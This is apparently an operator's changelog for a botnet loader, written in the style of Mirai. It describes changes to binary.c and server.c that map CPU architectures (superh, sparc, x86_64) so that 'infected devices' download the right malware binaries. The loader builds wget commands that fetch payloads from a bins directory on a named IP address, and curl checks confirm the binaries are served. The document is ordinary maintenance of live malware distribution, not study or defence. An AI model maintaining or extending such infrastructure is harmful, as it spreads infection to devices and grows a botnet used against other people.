# Architecture Mapping Fix

## Problem
Infected devices were requesting binaries for architectures that don't exist in `/var/www/html/bins/`:
- `static.superh` → 404 Not Found
- `static.sparc` → 404 Not Found  
- `static.x86_64` → 404 Not Found

## Solution
Updated the loader to map requested architectures to available binaries:

### Architecture Mappings:
- `superh` / `superh7` → `sh4`
- `sparc` → `spc` 
- `x86_64` → `x86`

### Changes Made:

1. **Updated `binary_get_by_arch()` in `binary.c`**:
   - Added architecture mapping logic
   - Maps requested architectures to available ones
   - Maintains backward compatibility

2. **Updated wget URL generation in `server.c`**:
   - Maps architecture before generating wget command
   - Uses mapped architecture in URL: `http://server/bins/static.{mapped_arch}`
   - Updated debug logging to show mapping

### Result:
- No more 404 errors for `superh`, `sparc`, `x86_64`
- Infected devices get correct binaries
- All architectures properly mapped to available binaries
- No symlinks or workarounds needed

### Verification:
```bash
# These now return 200 OK instead of 404:
curl -I http://185.247.117.214/bins/static.sh4    # (mapped from superh)
curl -I http://185.247.117.214/bins/static.spc    # (mapped from sparc)  
curl -I http://185.247.117.214/bins/static.x86    # (mapped from x86_64)
```

The loader now properly handles architecture mapping without any workarounds or symlinks.

